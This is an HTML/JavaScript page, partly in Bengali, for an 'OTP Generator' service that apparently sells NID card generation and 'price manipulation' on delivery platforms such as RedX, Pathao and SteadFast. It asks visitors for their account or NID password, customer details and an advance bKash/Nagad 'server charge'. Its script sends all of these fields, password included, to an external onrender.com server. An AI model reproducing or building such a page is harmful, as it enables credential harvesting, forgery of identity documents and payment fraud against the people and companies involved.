<!DOCTYPE HTML>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Payment Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 <link rel="stylesheet" href="./assets/css/main.css"> <!-- Correct css file -->
</head>
<body class="is-preload">
  <div id="bg"></div>
  <h1>Otp Generator Payment Page</h1>

<header id="header">
  <h3>Server Payment</h3>
  <p>
    পেমেন্ট কনফার্ম করে দয়াকরে অপেক্ষা করুন।
    স্ট্যাটাস দেখতে Dashboard চেক করুন।
    আপনার কাজ না হলে ৩-৬ ঘণ্টার মধ্যে আপনার পেমেন্ট রিটার্ন করে দেওয়া হবে।
    হেল্পলাইনঃ 01568760780 (WhatsApp)
  </p>
</header>

<section>
  <h3>Service & Payment Details</h3>

  <form id="payment-form">
    
    <label for="company">Company:</label>
    <select id="company" name="company" required>
      <option value="">Select Company</option>
      <option value="govt_nid">Govt NID</option>
      <option value="redx">RedX</option>
      <option value="pathao">Pathao</option>
      <option value="steadfast">SteadFast</option>
    </select><br>

    <label for="phone">Your Phone Number:</label>
    <input type="tel" id="phone" name="phone" required>
<br><br>
    <label for="password">NID/App Password:</label>
    <input type="password" id="password" name="password" required>
<br><br>
    <label for="serviceType">Service Type:</label>
    <select id="serviceType" name="serviceType" required>
      <option value="">Select Service</option>
      <option value="pricecng">Price Change</option>
      <option value="partial">Partial</option>
      <option value="nid">NID</option>
    </select><br><br>
     <label for="name">NID/Customer Name:</label>
    <input type="text" id="name" name="name" required>
    <br><br>
 <label for="phone1">Customer Phone Number:</label>
    <input type="tel" id="phone1" name="phone1" required>
    <br><br>
    <label for="amount1">Amount:</label>
    <input type="number" id="amount1" name="amount1" required>
    <p>পণ্যের মূল্য</p>
     <label for="amount2">Updated Amount:</label>
    <input type="number" id="amount2" name="amount2" required>
    <p>পরিবর্তিত মূল্য</p>

    <label for="method">Payment Method:</label>
    <select id="method" name="method" required>
      <option value="">Select Method</option>
      <option value="Bkash">Bkash</option>
      <option value="Nagad">Nagad</option>
    </select><br><br>
 <label for="amount3">Server Charge:</label>
<input type="number" id="amount3" name="amount3" readonly required>
    <p>কার্য সম্পাদনের জন্য সার্ভারচার্জ প্রদত্ত বিকাশ নাম্বারে অগ্রিম পরিশোধ করুন</p>
    
    <label for="trxid">TRX ID:</label>
    <input type="text" id="trxid" name="trxid" required>
<br><br><br><br>
    <button type="submit">Confirm Payment</button>
<br><br>
<!-- Add cancel button to form -->
<button type="button" id="cancelBtn" class="button">
  <i class="fas fa-ban"></i> Cancel & Clear
</button>
  </form>

  <div id="confirmation-message" style="margin-top: 20px;"></div>
</section>

<footer>
  <p>
    প্রতিটি এন আই ডি কার্ডের জন্য সর্বনিম্ন চার্জ ১০০০টাকা।
    অন্যান্য প্রাইস ম্যানুপুলেশান সার্ভিস গুলোর ক্ষেত্রে
    সার্ভারচার্জ আগেই পরিশোধ করতে হবে। নতুবা Ai জেনেরাটর চালু করা সম্ভব হবে না।
    এনআইডি কার্ড ছাড়া অন্যান্য সার্ভিস গুলোর ক্ষেত্রে
    দৈনিক ৫০টি ফ্রি সার্ভিস দেওয়া হবে এজন্য প্রদত্ত Whatsapp নাম্বারে টেক্সট করুন। প্রদত্ত নাম্বার ছাড়া অন্য কোন নাম্বারে যোগাযোগ করে কোন প্রতারণার
    শিকার হলে তার জন্য One1 কোনভাবেই দায়ী নয়।<br>Grate power comes with great responsibility,<br>So use it for ethical perposes only.
  </p>
</footer>
<script>
document.getElementById('payment-form').addEventListener('submit', function(e) {
  const phone = document.getElementById('phone').value;
  const amount = document.getElementById('amount1').value;

  if (!validateBDPhone(phone)) {
    alert('সঠিক বাংলাদেশী মোবাইল নম্বর দিন (01XXXXXXXXX)');
    e.preventDefault();
    return;
  }

  if (!validateAmount(amount)) {
    alert('অগ্রহণযোগ্য পরিমাণ (১০০ টাকা থেকে ১,০০,০০০ টাকা পর্যন্ত)');
    e.preventDefault();
    return;
  }
});
</script>  
  <script>
document.addEventListener('DOMContentLoaded', () => {
  // Initialize calculation AFTER persistence
  setTimeout(() => {
    const amount1 = document.getElementById('amount1');
    const amount2 = document.getElementById('amount2');
    const amount3 = document.getElementById('amount3');

    function calculate() {
      const val1 = parseFloat(amount1.value) || 0;
      const val2 = parseFloat(amount2.value) || 0;
      amount3.value = ((val1 - val2) / 2).toFixed(2);
    }

    amount1.addEventListener('input', calculate);
    amount2.addEventListener('input', calculate);
    calculate(); // Initial calculation
  }, 100);
});
</script>
<script>
  // Phone and amount validation
  function validateBDPhone(phone) {
  const normalized = phone.replace(/^(\+88)?/, ''); // Remove +88 if present
  const bdPhoneRegex = /^01[3-9]\d{8}$/;
  return bdPhoneRegex.test(normalized);
}


  function validateAmount(amount) {
    const minAmount = 100;
    const maxAmount = 100000;
    return amount >= minAmount && amount <= maxAmount;
  }

  document.getElementById('payment-form').addEventListener('submit', async function (e) {
    e.preventDefault();

    const company = document.getElementById('company').value;
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;
    const serviceType = document.getElementById('serviceType').value;
    const name = document.getElementById('name').value;
    const phone1 = document.getElementById('phone1').value;
    const amount1 = parseFloat(document.getElementById('amount1').value);
    const amount2 = parseFloat(document.getElementById('amount2').value);
    const amount3 = parseFloat(document.getElementById('amount3').value);
    const method = document.getElementById('method').value;
    const trxid = document.getElementById('trxid').value;

    if (!validateBDPhone(phone)) {
      alert('Invalid phone number. Please enter a valid Bangladeshi phone number (01XXXXXXXXX).');
      return;
    }

    if (!validateAmount(amount1)) {
      alert('Invalid amount. Please enter an amount between 100 and 100,000.');
      return;
    }

    const token = localStorage.getItem('token');

    try {
      const response = await fetch('https://otpgen-84pg.onrender.com/payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({
          company,
          phone,
          password,
          serviceType,
          name,
          phone1,
          amount1,
          amount2,
          amount3,
          method,
          trxid
        })
      });

      const result = await response.json();

      if (response.ok) {
        document.getElementById('confirmation-message').innerText = result.message || 'Payment successfully submitted!';
      } else {
        alert(result.message || 'An error occurred while processing your payment.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Failed to connect to the server. Please try again later.');
    }
  });

  // Server charge calculation
  document.addEventListener('DOMContentLoaded', () => {
    const amount1 = document.getElementById('amount1');
    const amount2 = document.getElementById('amount2');
    const amount3 = document.getElementById('amount3');

    function calculate() {
      const val1 = parseFloat(amount1.value) || 0;
      const val2 = parseFloat(amount2.value) || 0;
      amount3.value = ((val1 - val2) / 2).toFixed(2);
    }

    amount1.addEventListener('input', calculate);
    amount2.addEventListener('input', calculate);
    calculate();
  });
</script>

<!-- Payment form JS will be linked properly -->
<script src="./assets/js/main.js"></script>
</body>
</html>
